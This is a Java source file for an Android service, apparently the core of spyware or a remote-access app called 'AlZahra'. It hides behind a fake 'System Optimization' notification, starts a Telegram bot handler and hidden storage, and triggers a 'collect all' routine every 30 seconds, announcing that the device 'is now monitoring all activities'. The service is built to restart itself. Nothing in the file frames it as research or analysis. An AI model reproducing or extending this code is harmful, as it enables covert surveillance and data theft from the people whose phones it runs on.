package com.alzahra.services;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

import com.alzahra.AlZahraApp;
import com.alzahra.R;
import com.alzahra.storage.HiddenStorageManager;
import com.alzahra.telegram.AdvancedBotHandler;

public class CoreService extends Service {
    private Handler handler;
    private AdvancedBotHandler botHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        
        startForeground(1, buildNotification());
        
        botHandler = new AdvancedBotHandler(this);
        botHandler.start();
        
        HiddenStorageManager.initialize(this);
        sendStartupAlert();
        
        scheduleCollection();
    }

    private void sendStartupAlert() {
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                botHandler.sendAlert("🚀 System Started", "Device is now monitoring all activities");
            } catch (Exception e) {}
        }).start();
    }

    private void scheduleCollection() {
        handler.postDelayed(() -> {
            // Auto collection every 30 seconds
            Intent intent = new Intent(this, CollectorService.class);
            intent.setAction("COLLECT_ALL");
            startService(intent);
            
            scheduleCollection();
        }, 30000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, AlZahraApp.CHANNEL_ID)
            .setContentTitle("System Optimization")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (botHandler != null) botHandler.stop();
    }
}
